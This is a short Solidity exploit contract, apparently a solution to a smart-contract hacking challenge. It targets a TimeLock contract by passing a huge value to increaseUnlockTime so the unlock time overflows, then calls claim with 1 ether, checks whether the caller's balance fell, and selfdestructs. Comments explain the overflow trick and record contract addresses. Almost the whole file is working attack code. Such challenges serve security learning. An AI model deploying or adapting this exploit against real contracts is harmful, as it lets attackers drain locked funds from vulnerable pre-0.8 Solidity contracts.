pragma solidity ^0.6.12;

interface TimeLockInterface{
    function increaseUnlockTime(uint256 numSeconds) external;
    function claim ()external payable;
    function unlockTime() external returns(uint256);
}

contract HackTimeLock{
    constructor(address timeLockAddr) public payable{
        TimeLockInterface tl = TimeLockInterface(timeLockAddr);
        uint256 balance = msg.sender.balance;
        
        //my code
        // it creates an overflow to reduce the time and get the balance of timeLock
        tl.increaseUnlockTime(115792089237316195423570985008687907853269984665640564039457584007913129639936-(369 * 86400));//2**256
        
        // call claim function and send 1 ETH
        tl.claim{value:1 ether}();
        
        // In case the balance is less than before executing the claim, it will execute revert( )
        if(msg.sender.balance < balance)
        {
            revert();
        }
        
        selfdestruct(msg.sender);
    }
    
    //Fallback function
    receive () external payable{
        require(false);
    }
    
    //0xEc29164D68c4992cEdd1D386118A47143fdcF142
    //web3.eth.getBalance('0x746C5707Bfd8a4Be44332F21AC78A28e9340a9F4')
    //
}